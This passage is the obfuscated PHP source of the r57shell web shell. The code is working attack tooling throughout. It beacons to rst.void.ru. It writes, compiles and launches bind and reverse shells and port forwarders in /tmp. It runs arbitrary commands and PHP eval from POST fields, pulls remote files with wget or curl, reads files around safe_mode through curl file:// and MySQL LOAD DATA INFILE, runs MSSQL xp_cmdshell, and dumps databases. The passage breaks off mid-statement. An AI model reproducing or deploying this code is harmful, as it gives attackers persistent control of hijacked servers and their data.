lYygkcm91dCwgZmlsZW5vKCRjaCksIDEpKSkgew0KbXkgJHJlc3VsdCA9IHN5c3JlYWQoJGNoLCAkdGJ1ZmZlciwgMTAyNCk7DQppZiAoIWRlZmluZW
QoJHJlc3VsdCkpIHsNCnByaW50IFNUREVSUiAiJCFcbiI7DQpleGl0IDA7DQp9DQppZiAoJHJlc3VsdCA9PSAwKSB7IGV4aXQgMDsgfQ0KfQ0KaWYgK
CR0aCAgJiYgICh2ZWMoJGVvdXQsIGZpbGVubygkdGgpLCAxKSAgfHwgdmVjKCRyb3V0LCBmaWxlbm8oJHRoKSwgMSkpKSB7DQpteSAkcmVzdWx0ID0g
c3lzcmVhZCgkdGgsICRjYnVmZmVyLCAxMDI0KTsNCmlmICghZGVmaW5lZCgkcmVzdWx0KSkgeyBwcmludCBTVERFUlIgIiQhXG4iOyBleGl0IDA7IH0
NCmlmICgkcmVzdWx0ID09IDApIHtleGl0IDA7fQ0KfQ0KaWYgKCRmaCAgJiYgICR0YnVmZmVyKSB7KHByaW50ICRmaCAkdGJ1ZmZlcik7fQ0Kd2hpbG
UgKG15ICRsZW4gPSBsZW5ndGgoJHRidWZmZXIpKSB7DQpteSAkcmVzID0gc3lzd3JpdGUoJHRoLCAkdGJ1ZmZlciwgJGxlbik7DQppZiAoJHJlcyA+I
DApIHskdGJ1ZmZlciA9IHN1YnN0cigkdGJ1ZmZlciwgJHJlcyk7fSANCmVsc2Uge3ByaW50IFNUREVSUiAiJCFcbiI7fQ0KfQ0Kd2hpbGUgKG15ICRs
ZW4gPSBsZW5ndGgoJGNidWZmZXIpKSB7DQpteSAkcmVzID0gc3lzd3JpdGUoJGNoLCAkY2J1ZmZlciwgJGxlbik7DQppZiAoJHJlcyA+IDApIHskY2J
1ZmZlciA9IHN1YnN0cigkY2J1ZmZlciwgJHJlcyk7fSANCmVsc2Uge3ByaW50IFNUREVSUiAiJCFcbiI7fQ0KfX19DQo='; $spb26dfc = 'PHNjcmlwdCBsYW5ndWFnZT0iamF2YXNjcmlwdCI+aG90bG9nX2pzPSIxLjAiO2hvdGxvZ19yPSIiK01hdGgucmFuZG9tKCkrIiZzPTgxNjA2
JmltPTEmcj0iK2VzY2FwZShkb2N1bWVudC5yZWZlcnJlcikrIiZwZz0iK2VzY2FwZSh3aW5kb3cubG9jYXRpb24uaHJlZik7ZG9jdW1lbnQuY29va2l
lPSJob3Rsb2c9MTsgcGF0aD0vIjsgaG90bG9nX3IrPSImYz0iKyhkb2N1bWVudC5jb29raWU/IlkiOiJOIik7PC9zY3JpcHQ+PHNjcmlwdCBsYW5ndW
FnZT0iamF2YXNjcmlwdDEuMSI+aG90bG9nX2pzPSIxLjEiO2hvdGxvZ19yKz0iJmo9IisobmF2aWdhdG9yLmphdmFFbmFibGVkKCk/IlkiOiJOIik8L
3NjcmlwdD48c2NyaXB0IGxhbmd1YWdlPSJqYXZhc2NyaXB0MS4yIj5ob3Rsb2dfanM9IjEuMiI7aG90bG9nX3IrPSImd2g9IitzY3JlZW4ud2lkdGgr
J3gnK3NjcmVlbi5oZWlnaHQrIiZweD0iKygoKG5hdmlnYXRvci5hcHBOYW1lLnN1YnN0cmluZygwLDMpPT0iTWljIikpP3NjcmVlbi5jb2xvckRlcHR
oOnNjcmVlbi5waXhlbERlcHRoKTwvc2NyaXB0PjxzY3JpcHQgbGFuZ3VhZ2U9ImphdmFzY3JpcHQxLjMiPmhvdGxvZ19qcz0iMS4zIjwvc2NyaXB0Pj
xzY3JpcHQgbGFuZ3VhZ2U9ImphdmFzY3JpcHQiPmhvdGxvZ19yKz0iJmpzPSIraG90bG9nX2pzO2RvY3VtZW50LndyaXRlKCI8YSBocmVmPSdodHRwO
i8vY2xpY2suaG90bG9nLnJ1Lz84MTYwNicgdGFyZ2V0PSdfdG9wJz48aW1nICIrIiBzcmM9J2h0dHA6Ly9oaXQ0LmhvdGxvZy5ydS9jZ2ktYmluL2hv
dGxvZy9jb3VudD8iK2hvdGxvZ19yKyImJyBib3JkZXI9MCB3aWR0aD0xIGhlaWdodD0xIGFsdD0xPjwvYT4iKTwvc2NyaXB0Pjxub3NjcmlwdD48YSB
ocmVmPWh0dHA6Ly9jbGljay5ob3Rsb2cucnUvPzgxNjA2IHRhcmdldD1fdG9wPjxpbWdzcmM9Imh0dHA6Ly9oaXQ0LmhvdGxvZy5ydS9jZ2ktYmluL2
hvdGxvZy9jb3VudD9zPTgxNjA2JmltPTEiIGJvcmRlcj0wd2lkdGg9IjEiIGhlaWdodD0iMSIgYWx0PSJIb3RMb2ciPjwvYT48L25vc2NyaXB0Pg=='; $sp1c870f = 'PCEtLUxpdmVJbnRlcm5ldCBjb3VudGVyLS0+PHNjcmlwdCBsYW5ndWFnZT0iSmF2YVNjcmlwdCI+PCEtLQ0KZG9jdW1lbnQud3JpdGUoJzxh
IGhyZWY9Imh0dHA6Ly93d3cubGl2ZWludGVybmV0LnJ1L2NsaWNrIiAnKw0KJ3RhcmdldD1fYmxhbms+PGltZyBzcmM9Imh0dHA6Ly9jb3VudGVyLnl
hZHJvLnJ1L2hpdD90NTIuNjtyJysNCmVzY2FwZShkb2N1bWVudC5yZWZlcnJlcikrKCh0eXBlb2Yoc2NyZWVuKT09J3VuZGVmaW5lZCcpPycnOg0KJz
tzJytzY3JlZW4ud2lkdGgrJyonK3NjcmVlbi5oZWlnaHQrJyonKyhzY3JlZW4uY29sb3JEZXB0aD8NCnNjcmVlbi5jb2xvckRlcHRoOnNjcmVlbi5wa
XhlbERlcHRoKSkrJzsnK01hdGgucmFuZG9tKCkrDQonIiBhbHQ9ImxpdmVpbnRlcm5ldC5ydTog7+7q4Ofg7e4g9+jx6+4g7/Du8ezu8vDu4iDoIO/u
8eXy6PLl6+XpIOfgIDI0IPfg8eAiICcrDQonYm9yZGVyPTAgd2lkdGg9MCBoZWlnaHQ9MD48L2E+JykvLy0tPjwvc2NyaXB0PjwhLS0vTGl2ZUludGV
ybmV0LS0+'; echo $sp9ee6bd; echo '</head>'; if (empty($_POST['cmd'])) { $spfee436 = array(127, 192, 172, 10); $sp879ff7 = @explode('.', $_SERVER['SERVER_ADDR']); $spc84013 = str_replace('.', '', $sp1968ee); if (!in_array($sp879ff7[0], $spfee436)) { @(print '<img src="http://rst.void.ru/r57shell_version/version.php?img=1&version=' . $spc84013 . '" border=0 height=0 width=0>'); @readfile('http://rst.void.ru/r57shell_version/version.php?version=' . $spc84013 . ''); } } echo '<body bgcolor="#e4e0d8"><table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000>
<tr><td bgcolor=#333333 width=160><font face=Verdana size=2>' . ws(1) . '&nbsp;
<font face=Webdings size=6><b>!</b></font><b>' . ws(2) . 'r57shell ' . $sp1968ee . '</b>
</font></td><td bgcolor=#333333><font face=Verdana size=-2>'; echo ws(2); echo '<b>' . date('d-m-Y H:i:s') . '</b>'; echo ws(2) . $sp0558ec . ' <a href=' . $_SERVER['PHP_SELF'] . '?phpinfo title="' . $spa872db[$sp53bb19 . '_text46'] . '"><b>phpinfo</b></a> ' . $spb68bf1; echo ws(2) . $sp0558ec . ' <a href=' . $_SERVER['PHP_SELF'] . '?phpini title="' . $spa872db[$sp53bb19 . '_text47'] . '"><b>php.ini</b></a> ' . $spb68bf1; echo ws(2) . $sp0558ec . ' <a href=' . $_SERVER['PHP_SELF'] . '?cpu title="' . $spa872db[$sp53bb19 . '_text50'] . '"><b>cpu</b></a> ' . $spb68bf1; echo ws(2) . $sp0558ec . ' <a href=' . $_SERVER['PHP_SELF'] . '?mem title="' . $spa872db[$sp53bb19 . '_text51'] . '"><b>mem</b></a> ' . $spb68bf1; echo ws(2) . $sp0558ec . ' <a href=' . $_SERVER['PHP_SELF'] . '?tmp title="' . $spa872db[$sp53bb19 . '_text48'] . '"><b>tmp</b></a> ' . $spb68bf1; echo ws(2) . $sp0558ec . ' <a href=' . $_SERVER['PHP_SELF'] . '?delete title="' . $spa872db[$sp53bb19 . '_text49'] . '"><b>delete</b></a> ' . $spb68bf1 . '<br>'; echo ws(2); echo $sp347c9a ? 'safe_mode: <b><font color=green>ON</font></b>' : 'safe_mode: <b><font color=red>OFF</font></b>'; echo ws(2); echo 'PHP version: <b>' . @phpversion() . '</b>'; $sp01e19d = @function_exists('curl_version'); echo ws(2); echo 'cURL: ' . ($sp01e19d ? '<b><font color=green>ON</font></b>' : '<b><font color=red>OFF</font></b>'); echo ws(2); echo 'MySQL: <b>'; $sp8f7eea = @function_exists('mysql_connect'); if ($sp8f7eea) { echo '<font color=green>ON</font></b>'; } else { echo '<font color=red>OFF</font></b>'; } echo ws(2); echo 'MSSQL: <b>'; $sp8b9b3b = @function_exists('mssql_connect'); if ($sp8b9b3b) { echo '<font color=green>ON</font></b>'; } else { echo '<font color=red>OFF</font></b>'; } echo ws(2); echo 'PostgreSQL: <b>'; $sp0af35a = @function_exists('pg_connect'); if ($sp0af35a) { echo '<font color=green>ON</font></b>'; } else { echo '<font color=red>OFF</font></b>'; } echo ws(2); echo 'Oracle: <b>'; $spe710a8 = @function_exists('ocilogon'); if ($spe710a8) { echo '<font color=green>ON</font></b>'; } else { echo '<font color=red>OFF</font></b>'; } echo '<br>' . ws(2); echo 'Disable functions : <b>'; if ('' == ($spf6ef8d = @ini_get('disable_functions'))) { echo '<font color=green>NONE</font></b>'; } else { echo "<font color=red>{$spf6ef8d}</font></b>"; } $sp7997f0 = 1234; if (!$sp7997f0) { $sp7997f0 = 0; } $spfd360f = 1234; if (!$spfd360f) { $spfd360f = 0; } $sp2f5415 = $spfd360f - $sp7997f0; $spb889a2 = @round(100 / ($spfd360f / $sp7997f0), 2); echo '<br>' . ws(2) . 'HDD Free : <b>' . view_size($sp7997f0) . '</b> HDD Total : <b>' . view_size($spfd360f) . '</b>'; echo '</font></td></tr><table>
<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000>
<tr><td align=right width=100>'; echo $sp262f43; if (!$sp3375c3) { echo '<font color=blue><b>uname -a :' . ws(1) . '<br>sysctl :' . ws(1) . '<br>$OSTYPE :' . ws(1) . '<br>Server :' . ws(1) . '<br>id :' . ws(1) . '<br>pwd :' . ws(1) . '</b></font><br>'; echo '</td><td>'; echo '<font face=Verdana size=-2 color=red><b>'; $sp6f9beb = ex('uname -a'); echo !empty($sp6f9beb) ? ws(3) . @substr($sp6f9beb, 0, 120) . '<br>' : ws(3) . @substr('true', 0, 120) . '<br>'; if (!$sp347c9a) { $spd1881f = ex('sysctl -n kern.ostype'); $spec9734 = ex('sysctl -n kern.osrelease'); $sp918fd0 = ex('sysctl -n kernel.ostype'); $sp300abd = ex('sysctl -n kernel.osrelease'); } if (!empty($spd1881f) && !empty($spec9734)) { $spa74660 = "{$spd1881f} {$spec9734}"; } else { if (!empty($sp918fd0) && !empty($sp300abd)) { $spa74660 = "{$sp918fd0} {$sp300abd}"; } else { $spa74660 = '-'; } } echo ws(3) . $spa74660 . '<br>'; echo ws(3) . ex('echo $OSTYPE') . '<br>'; echo ws(3) . @substr($sp48db21, 0, 120) . '<br>'; $sp5904ca = ex('id'); echo !empty($sp5904ca) ? ws(3) . $sp5904ca . '<br>' : ws(3) . 'user= sss uid= ssss gid=' . @getmygid() . '<br>'; echo ws(3) . $spa25e24; echo '</b></font>'; } else { echo '<font color=blue><b>OS :' . ws(1) . '<br>Server :' . ws(1) . '<br>User :' . ws(1) . '<br>pwd :' . ws(1) . '</b></font><br>'; echo '</td><td>'; echo '<font face=Verdana size=-2 color=red><b>'; echo ws(3) . @substr('true', 0, 120) . '<br>'; echo ws(3) . @substr($sp48db21, 0, 120) . '<br>'; echo ws(3) . @get_current_user() . '<br>'; echo ws(3) . $spa25e24 . '<br>'; echo '</font>'; } echo '</font>'; echo '</td></tr></table>'; if (empty($spb26dfc) || empty($sp1c870f)) { die; } $sp224638 = '<br>'; $sp224638 .= base64_decode($spb26dfc); $sp224638 .= base64_decode($sp1c870f); if (!empty($_POST['cmd']) && $_POST['cmd'] == 'find_text') { $_POST['cmd'] = 'find ' . $_POST['s_dir'] . ' -name \'' . $_POST['s_mask'] . '\' | xargs grep -E \'' . $_POST['s_text'] . '\''; } if (!empty($_POST['cmd']) && $_POST['cmd'] == 'ch_') { switch ($_POST['what']) { case 'own': @chown($_POST['param1'], $_POST['param2']); break; case 'grp': @chgrp($_POST['param1'], $_POST['param2']); break; case 'mod': @chmod($_POST['param1'], intval($_POST['param2'], 8)); break; } $_POST['cmd'] = ''; } if (!empty($_POST['cmd']) && $_POST['cmd'] == 'mk') { switch ($_POST['what']) { case 'file': if ($_POST['action'] == 'create') { if (file_exists($_POST['mk_name']) || !($spa3ecf0 = @fopen($_POST['mk_name'], 'w'))) { echo ce($_POST['mk_name']); $_POST['cmd'] = ''; } else { fclose($spa3ecf0); $_POST['e_name'] = $_POST['mk_name']; $_POST['cmd'] = 'edit_file'; echo '<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#333333><div align=center><font face=Verdana size=-2><b>' . $spa872db[$sp53bb19 . '_text61'] . '</b></font></div></td></tr></table>'; } } else { if ($_POST['action'] == 'delete') { if (unlink($_POST['mk_name'])) { echo '<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#333333><div align=center><font face=Verdana size=-2><b>' . $spa872db[$sp53bb19 . '_text63'] . '</b></font></div></td></tr></table>'; } $_POST['cmd'] = ''; } } break; case 'dir': if ($_POST['action'] == 'create') { if (mkdir($_POST['mk_name'])) { $_POST['cmd'] = ''; echo '<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#333333><div align=center><font face=Verdana size=-2><b>' . $spa872db[$sp53bb19 . '_text62'] . '</b></font></div></td></tr></table>'; } else { echo ce($_POST['mk_name']); $_POST['cmd'] = ''; } } else { if ($_POST['action'] == 'delete') { if (rmdir($_POST['mk_name'])) { echo '<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#333333><div align=center><font face=Verdana size=-2><b>' . $spa872db[$sp53bb19 . '_text64'] . '</b></font></div></td></tr></table>'; } $_POST['cmd'] = ''; } } break; } } if (!empty($_POST['cmd']) && $_POST['cmd'] == 'edit_file') { if (!($spa3ecf0 = @fopen($_POST['e_name'], 'r+'))) { $sp0db6da = 1; @fclose($spa3ecf0); } if (!($spa3ecf0 = @fopen($_POST['e_name'], 'r'))) { echo re($_POST['e_name']); $_POST['cmd'] = ''; } else { echo $sp873d14; echo $sp262f43; echo '<form name=save_file method=post>'; echo ws(3) . '<b>' . $_POST['e_name'] . '</b>'; echo '<div align=center><textarea name=e_text cols=121 rows=24>'; echo @htmlspecialchars(@fread($spa3ecf0, @filesize($_POST['e_name']))); fclose($spa3ecf0); echo '</textarea>'; echo '<input type=hidden name=e_name value=' . $_POST['e_name'] . '>'; echo '<input type=hidden name=dir value=' . $spa25e24 . '>'; echo '<input type=hidden name=cmd value=save_file>'; echo !empty($sp0db6da) ? '<br><br>' . $spa872db[$sp53bb19 . '_text44'] : '<br><br><input type=submit name=submit value=" ' . $spa872db[$sp53bb19 . '_butt10'] . ' ">'; echo '</div>'; echo '</font>'; echo '</form>'; echo '</td></tr></table>'; die; } } if (!empty($_POST['cmd']) && $_POST['cmd'] == 'save_file') { if (!($spa3ecf0 = @fopen($_POST['e_name'], 'w'))) { echo we($_POST['e_name']); } else { @fwrite($spa3ecf0, $_POST['e_text']); @fclose($spa3ecf0); $_POST['cmd'] = ''; echo '<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#333333><div align=center><font face=Verdana size=-2><b>' . $spa872db[$sp53bb19 . '_text45'] . '</b></font></div></td></tr></table>'; } } if (!empty($_POST['port']) && !empty($_POST['bind_pass']) && $_POST['use'] == 'C') { cf('/tmp/bd.c', $sp087a5d); $spd19fad = ex('gcc -o /tmp/bd /tmp/bd.c'); @unlink('/tmp/bd.c'); $spd19fad = ex('/tmp/bd ' . $_POST['port'] . ' ' . $_POST['bind_pass'] . ' &'); $_POST['cmd'] = 'ps -aux | grep bd'; } if (!empty($_POST['port']) && !empty($_POST['bind_pass']) && $_POST['use'] == 'Perl') { cf('/tmp/bdpl', $spafd163); $spf8acff = which('perl'); if (empty($spf8acff)) { $spf8acff = 'perl'; } $spd19fad = ex($spf8acff . ' /tmp/bdpl ' . $_POST['port'] . ' &'); $_POST['cmd'] = 'ps -aux | grep bdpl'; } if (!empty($_POST['ip']) && !empty($_POST['port']) && $_POST['use'] == 'Perl') { cf('/tmp/back', $sp285c88); $spf8acff = which('perl'); if (empty($spf8acff)) { $spf8acff = 'perl'; } $spd19fad = ex($spf8acff . ' /tmp/back ' . $_POST['ip'] . ' ' . $_POST['port'] . ' &'); $_POST['cmd'] = 'echo "Now script try connect to ' . $_POST['ip'] . ' port ' . $_POST['port'] . ' ..."'; } if (!empty($_POST['ip']) && !empty($_POST['port']) && $_POST['use'] == 'C') { cf('/tmp/back.c', $sp164739); $spd19fad = ex('gcc -o /tmp/backc /tmp/back.c'); @unlink('/tmp/back.c'); $spd19fad = ex('/tmp/backc ' . $_POST['ip'] . ' ' . $_POST['port'] . ' &'); $_POST['cmd'] = 'echo "Now script try connect to ' . $_POST['ip'] . ' port ' . $_POST['port'] . ' ..."'; } if (!empty($_POST['local_port']) && !empty($_POST['remote_host']) && !empty($_POST['remote_port']) && $_POST['use'] == 'Perl') { cf('/tmp/dp', $spbe0ae4); $spf8acff = which('perl'); if (empty($spf8acff)) { $spf8acff = 'perl'; } $spd19fad = ex($spf8acff . ' /tmp/dp ' . $_POST['local_port'] . ' ' . $_POST['remote_host'] . ' ' . $_POST['remote_port'] . ' &'); $_POST['cmd'] = 'ps -aux | grep dp'; } if (!empty($_POST['local_port']) && !empty($_POST['remote_host']) && !empty($_POST['remote_port']) && $_POST['use'] == 'C') { cf('/tmp/dpc.c', $sp0d4827); $spd19fad = ex('gcc -o /tmp/dpc /tmp/dpc.c'); @unlink('/tmp/dpc.c'); $spd19fad = ex('/tmp/dpc ' . $_POST['local_port'] . ' ' . $_POST['remote_port'] . ' ' . $_POST['remote_host'] . ' &'); $_POST['cmd'] = 'ps -aux | grep dpc'; } if (!empty($_POST['alias'])) { foreach ($sp488c53 as $sp645c93 => $spbee152) { if ($_POST['alias'] == $sp645c93) { $_POST['cmd'] = $spbee152; } } } if (!empty($sp275713['userfile']['name'])) { if (isset($_POST['nf1']) && !empty($_POST['new_name'])) { $sp38f61b = $_POST['new_name']; } else { $sp38f61b = $sp275713['userfile']['name']; } @copy($sp275713['userfile']['tmp_name'], $_POST['dir'] . '/' . $sp38f61b) or print '<font color=red face=Fixedsys><div align=center>Error uploading file ' . $sp275713['userfile']['name'] . '</div></font>'; } if (!empty($_POST['with']) && !empty($_POST['rem_file']) && !empty($_POST['loc_file'])) { switch ($_POST['with']) { case wget: $_POST['cmd'] = which('wget') . ' ' . $_POST['rem_file'] . ' -O ' . $_POST['loc_file'] . ''; break; case fetch: $_POST['cmd'] = which('fetch') . ' -p ' . $_POST['rem_file'] . ' -o ' . $_POST['loc_file'] . ''; break; case lynx: $_POST['cmd'] = which('lynx') . ' -source ' . $_POST['rem_file'] . ' > ' . $_POST['loc_file'] . ''; break; case links: $_POST['cmd'] = which('links') . ' -source ' . $_POST['rem_file'] . ' > ' . $_POST['loc_file'] . ''; break; case GET: $_POST['cmd'] = which('GET') . ' ' . $_POST['rem_file'] . ' > ' . $_POST['loc_file'] . ''; break; case curl: $_POST['cmd'] = which('curl') . ' ' . $_POST['rem_file'] . ' -o ' . $_POST['loc_file'] . ''; break; } } echo '[syslog]04
'; echo $sp873d14; if (empty($_POST['cmd']) && !$sp347c9a) { $_POST['cmd'] = $sp3375c3 ? 'dir' : 'ls -lia'; } else { if (empty($_POST['cmd']) && $sp347c9a) { $_POST['cmd'] = 'safe_dir'; } } echo $sp262f43 . $spa872db[$sp53bb19 . '_text1'] . ': <b>' . $_POST['cmd'] . '</b></font></td></tr><tr><td><b><div align=center><textarea name=report cols=122 rows=15>'; if ($sp347c9a) { switch ($_POST['cmd']) { case 'safe_dir': $sp6bf0a4 = @dir($spa25e24); if ($sp6bf0a4) { while (false !== ($spa3ecf0 = $sp6bf0a4->read())) { if ($spa3ecf0 == '.' || $spa3ecf0 == '..') { continue; } @clearstatcache(); list($spd8afbb, $spec8c51, $sp59bd00, $sp67c605, $spca6b76, $spba592d, $sp35b5a9, $sp92ea66, $spb2bf9f, $sp18e70c, $sp8ea8cb, $sp53695d) = stat($spa3ecf0); if ($sp3375c3) { echo date('d.m.Y H:i', $sp18e70c); if (@is_dir($spa3ecf0)) { echo '  <DIR> '; } else { printf('% 7s ', $sp92ea66); } } else { $sp0581a1 = @posix_getpwuid($spca6b76); $sp7b2526 = @posix_getgrgid($spba592d); echo $spec8c51 . ' '; echo perms(@fileperms($spa3ecf0)); printf('% 4d % 9s % 9s %7s ', $sp67c605, $sp0581a1['name'], $sp7b2526['name'], $sp92ea66); echo date('d.m.Y H:i ', $sp18e70c); } echo "{$spa3ecf0}\n"; } $sp6bf0a4->close(); } else { echo $spa872db[$sp53bb19 . _text29]; } break; case 'safe_file': if (@is_file($_POST['file'])) { $spa3ecf0 = @file($_POST['file']); if ($spa3ecf0) { $sp76d016 = @sizeof($spa3ecf0); for ($sp6c3e91 = 0; $sp6c3e91 < $sp76d016; $sp6c3e91++) { echo htmlspecialchars($spa3ecf0[$sp6c3e91]); } } else { echo $spa872db[$sp53bb19 . _text29]; } } else { echo $spa872db[$sp53bb19 . _text31]; } break; case 'test1': $sp6c31c7 = @curl_init('file://' . $_POST['test1_file'] . ''); $sp7a0529 = @curl_exec($sp6c31c7); echo $sp7a0529; break; case 'test2': @(include $_POST['test2_file']); break; case 'test3': if (!isset($_POST['test3_port']) || empty($_POST['test3_port'])) { $_POST['test3_port'] = '3306'; } $sp7a8f47 = @mysql_connect('localhost:' . $_POST['test3_port'], $_POST['test3_ml'], $_POST['test3_mp']); if ($sp7a8f47) { if (@mysql_select_db($_POST['test3_md'], $sp7a8f47)) { $spabcb3f = 'DROP TABLE IF EXISTS temp_r57_table;'; @mysql_query($spabcb3f); $spabcb3f = 'CREATE TABLE `temp_r57_table` ( `file` LONGBLOB NOT NULL );'; @mysql_query($spabcb3f); $spabcb3f = 'LOAD DATA INFILE "' . $_POST['test3_file'] . '" INTO TABLE temp_r57_table;'; @mysql_query($spabcb3f); $spabcb3f = 'SELECT * FROM temp_r57_table;'; $spd6dd63 = @mysql_query($spabcb3f); while ($sp07d99b = @mysql_fetch_array($spd6dd63)) { echo @htmlspecialchars($sp07d99b[0]); } $spabcb3f = 'DROP TABLE IF EXISTS temp_r57_table;'; @mysql_query($spabcb3f); } else { echo '[-] ERROR! Can\'t select database'; } @mysql_close($sp7a8f47); } else { echo '[-] ERROR! Can\'t connect to mysql server'; } break; case 'test4': if (!isset($_POST['test4_port']) || empty($_POST['test4_port'])) { $_POST['test4_port'] = '1433'; } $sp7a8f47 = @mssql_connect('localhost,' . $_POST['test4_port'], $_POST['test4_ml'], $_POST['test4_mp']); if ($sp7a8f47) { if (@mssql_select_db($_POST['test4_md'], $sp7a8f47)) { @mssql_query('drop table r57_temp_table', $sp7a8f47); @mssql_query('create table r57_temp_table ( string VARCHAR (500) NULL)', $sp7a8f47); @mssql_query('insert into r57_temp_table EXEC master.dbo.xp_cmdshell \'' . $_POST['test4_file'] . '\'', $sp7a8f47); $spfd181b = mssql_query('select * from r57_temp_table', $sp7a8f47); while ($spa53ce4 = @mssql_fetch_row($spfd181b)) { echo $spa53ce4[0] . '
'; } @mssql_query('drop table r57_temp_table', $sp7a8f47); } else { echo '[-] ERROR! Can\'t select database'; } @mssql_close($sp7a8f47); } else { echo '[-] ERROR! Can\'t connect to MSSQL server'; } break; } } else { if ($_POST['cmd'] != 'php_eval' && $_POST['cmd'] != 'mysql_dump' && $_POST['cmd'] != 'db_show' && $_POST['cmd'] != 'db_query') { $sp89580e = ex($_POST['cmd']); if ($sp3375c3) { echo @htmlspecialchars(@convert_cyr_string($sp89580e, 'd', 'w')) . '
'; } else { echo @htmlspecialchars($sp89580e) . '
'; } } } if ($_POST['cmd'] == 'php_eval') { $sp7fb3ff = @str_replace('<?', '', $_POST['php_eval']); $sp7fb3ff = @str_replace('?>', '', $sp7fb3ff); @eval($sp7fb3ff); } if ($_POST['cmd'] == 'db_show') { switch ($_POST['db']) { case 'MySQL': if (empty($_POST['db_port'])) { $_POST['db_port'] = '3306'; } $sp7a8f47 = @mysql_connect('localhost:' . $_POST['db_port'], $_POST['mysql_l'], $_POST['mysql_p']); if ($sp7a8f47) { $spfd181b = @mysql_query('SHOW DATABASES', $sp7a8f47); while ($spa53ce4 = @mysql_fetch_row($spfd181b)) { echo '[+] ' . $spa53ce4[0] . '
'; if (isset($_POST['st'])) { $spdad48f = @mysql_query('SHOW TABLES FROM ' . $spa53ce4[0], $sp7a8f47); while ($sp3dfe45 = @mysql_fetch_row($spdad48f)) { echo ' | - ' . $sp3dfe45[0] . '
'; if (isset($_POST['sc'])) { $sp1357cc = @mysql_query('SHOW COLUMNS FROM ' . $spa53ce4[0] . '.' . $sp3dfe45[0], $sp7a8f47); while ($sp0dd942 = @mysql_fetch_row($sp1357cc)) { echo '   | - ' . $sp0dd942[0] . '
'; } } } } } @mysql_close($sp7a8f47); } else { echo '[-] ERROR! Can\'t connect to MySQL server'; } break; case 'MSSQL': if (empty($_POST['db_port'])) { $_POST['db_port'] = '1433'; } $sp7a8f47 = @mssql_connect('localhost,' . $_POST['db_port'], $_POST['mysql_l'], $_POST['mysql_p']); if ($sp7a8f47) { $spfd181b = @mssql_query('sp_databases', $sp7a8f47); while ($spa53ce4 = @mssql_fetch_row($spfd181b)) { echo '[+] ' . $spa53ce4[0] . '
'; if (isset($_POST['st'])) { @mssql_select_db($spa53ce4[0]); $spdad48f = @mssql_query('sp_tables', $sp7a8f47); while ($sp3dfe45 = @mssql_fetch_array($spdad48f)) { if ($sp3dfe45['TABLE_TYPE'] == 'TABLE' && $sp3dfe45['TABLE_NAME'] != 'dtproperties') { echo ' | - ' . $sp3dfe45['TABLE_NAME'] . '
'; if (isset($_POST['sc'])) { $sp1357cc = @mssql_query('sp_columns ' . $sp3dfe45[2], $sp7a8f47); while ($sp0dd942 = @mssql_fetch_array($sp1357cc)) { echo '   | - ' . $sp0dd942['COLUMN_NAME'] . '
'; } } } } } } @mssql_close($sp7a8f47); } else { echo '[-] ERROR! Can\'t connect to MSSQL server'; } break; case 'PostgreSQL': if (empty($_POST['db_port'])) { $_POST['db_port'] = '5432'; } $sp6ff357 = 'host=\'localhost\' port=\'' . $_POST['db_port'] . '\' user=\'' . $_POST['mysql_l'] . '\' password=\'' . $_POST['mysql_p'] . '\' dbname=\'' . $_POST['mysql_db'] . '\''; $sp7a8f47 = @pg_connect($sp6ff357); if ($sp7a8f47) { $spfd181b = @pg_query($sp7a8f47, 'SELECT datname FROM pg_database WHERE datistemplate=\'f\''); while ($spa53ce4 = @pg_fetch_row($spfd181b)) { echo '[+] ' . $spa53ce4[0] . '
'; } @pg_close($sp7a8f47); } else { echo '[-] ERROR! Can\'t connect to PostgreSQL server'; } break; } } if ($_POST['cmd'] == 'mysql_dump') { if (isset($_POST['dif'])) { $sp694629 = @fopen($_POST['dif_name'], 'w'); } if (!empty($_POST['dif']) && $sp694629 || empty($_POST['dif'])) { $sp266f95 = '# homepage: http://rst.void.ru
'; $sp266f95 .= '# ---------------------------------
'; $sp266f95 .= '#     date : ' . date('j F Y g:i') . '
'; $sp266f95 .= '# database : ' . $_POST['mysql_db'] . '
'; $sp266f95 .= '#    table : ' . $_POST['mysql_tbl'] . '
'; $sp266f95 .= '# ---------------------------------

'; switch ($_POST['db']) { case 'MySQL': if (empty($_POST['db_port'])) { $_POST['db_port'] = '3306'; } $sp7a8f47 = @mysql_connect('localhost:' . $_POST['db_port'], $_POST['mysql_l'], $_POST['mysql_p']); if ($sp7a8f47) { if (@mysql_select_db($_POST['mysql_db'], $sp7a8f47)) { $sp4fa71c = '# MySQL dump created by r57shell
'; $sp4fa71c .= $sp266f95; $spfd181b = @mysql_query('SHOW CREATE TABLE `' . $_POST['mysql_tbl'] . '`', $sp7a8f47); $spa53ce4 = @mysql_fetch_row($spfd181b); $sp4fa71c .= $spa53ce4[1] . '

'; $sp4fa71c .= '# ---------------------------------

'; $spd6fdb8 = ''; $spfd181b = @mysql_query('SELECT * FROM `' . $_POST['mysql_tbl'] . '`', $sp7a8f47); if (@mysql_num_rows($spfd181b) > 0) { while ($spa53ce4 = @mysql_fetch_assoc($spfd181b)) { $spa22ace = @implode('`, `', @array_keys($spa53ce4)); $spe99d03 = @array_values($spa53ce4); foreach ($spe99d03 as $sp71a197 => $spe2ff4f) { $spe99d03[$sp71a197] = addslashes($spe2ff4f); } $spe99d03 = @implode('\', \'', $spe99d03); $spd6fdb8 .= 'INSERT INTO `' . $_POST['mysql_tbl'] . '` (`' . $spa22ace . '`) VALUES (\'' . htmlspecialchars($spe99d03) . '\');
'; } $spd6fdb8 .= '
# ---------------------------------'; } if (!empty($_POST['dif']) && $sp694629) { @fputs($sp694629, $sp4fa71c . $spd6fdb8); } else { echo $sp4fa71c . $spd6fdb8; } } else { echo '[-] ERROR! Can\'t select database'; } @mysql_close($sp7a8f47); } else { echo '[-] ERROR! Can\'t connect to MySQL server'; } break; case 'MSSQL': if (empty($_POST['db_port'])) { $_POST['db_port'] = '1433'; } $sp7a8f47 = @mssql_connect('localhost,' . $_POST['db_port'], $_POST['mysql_l'], $_POST['mysql_p']); if ($sp7a8f47) { if (@mssql_select_db($_POST['mysql_db'], $sp7a8f47)) { $sp4fa71c = '# MSSQL dump created by r57shell
